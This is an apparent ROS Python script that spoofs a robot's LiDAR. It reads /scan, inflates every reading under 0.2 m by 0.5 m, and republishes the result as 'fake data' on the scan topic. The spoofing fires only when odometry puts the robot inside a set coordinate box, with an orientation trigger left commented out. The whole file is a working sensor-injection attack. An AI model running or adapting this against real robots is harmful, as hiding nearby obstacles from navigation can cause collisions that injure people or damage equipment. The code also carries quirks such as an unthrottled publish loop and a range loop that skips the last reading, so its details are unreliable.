#!/usr/bin/env python3

import rospy
from sensor_msgs.msg import LaserScan
from geometry_msgs.msg import Vector3
from geometry_msgs.msg import Point
from nav_msgs.msg import Odometry

import time
import copy
import math
from math import *


num_readings = 360
laser_frequency = 60
limit = 0
ranges_filter = []
intensities_filter = []
x, y, th, q2 = 0.0, 0.0, 0.0, 0.0

    
def callback(data):
    global ranges_filter, intensities_filter
    len(data.ranges)
    len(data.intensities)
    
    ranges_filter = copy.copy(data.ranges)
    intensities_filter = copy.copy(data.intensities)
    
    ranges_filter = list(ranges_filter)
    intensities_filter = list(intensities_filter)
    
    # Ranges are degrees, 0-359 means whole circle
    for x in range(0, 359):
    	# If range < 0.2, 0.5 meters get added
        if (data.ranges[x] < 0.2):
            ranges_filter[x] = data.ranges[x] + 0.5
        else:
            ranges_filter[x] = data.ranges[x]
    
def callback_odom(data):
    global x,y,th,q2
    x = data.pose.pose.position.x
    y = data.pose.pose.position.y
    q1 = data.pose.pose.orientation.x
    q2 = data.pose.pose.orientation.y
    q3 = data.pose.pose.orientation.z
    q4 = data.pose.pose.orientation.w
    q = (q1, q2, q3, q4)
      
def main():

    rospy.init_node('laser_scan_publisher')
    scan_pub = rospy.Publisher('scan', LaserScan, queue_size=50)
    rospy.Subscriber("/scan", LaserScan, callback)
    rospy.Subscriber('/odom', Odometry, callback_odom)
    
    #rate = rospy.Rate(1.0)
    while not rospy.is_shutdown():
        current_time = rospy.Time.now()
    
        scan = LaserScan()
    
        scan.header.stamp = current_time
        scan.header.frame_id = 'base_scan'
        scan.angle_min = 0
        scan.angle_max = math.pi * 2
        scan.angle_increment = 0.0174532923847
        scan.time_increment = 2.98699997074e-05
        scan.range_min = 0.0
        scan.range_max = 5.0

        scan.ranges = []
        scan.intensities = []
        for i in range(0, num_readings-1):
            scan.ranges = copy.copy(ranges_filter)  # fake data

	# Trigger Spoofing based on coordinates
        while x >= 0.0 and x < 2.9 and y > -0.4 and y < 0.45:
        #while abs(q2) > 0.01 and y > -0.4 and y < 0.45: #Trigger spoofing based on orientation
            scan_pub.publish(scan)

            
if __name__ == "__main__":
    main()

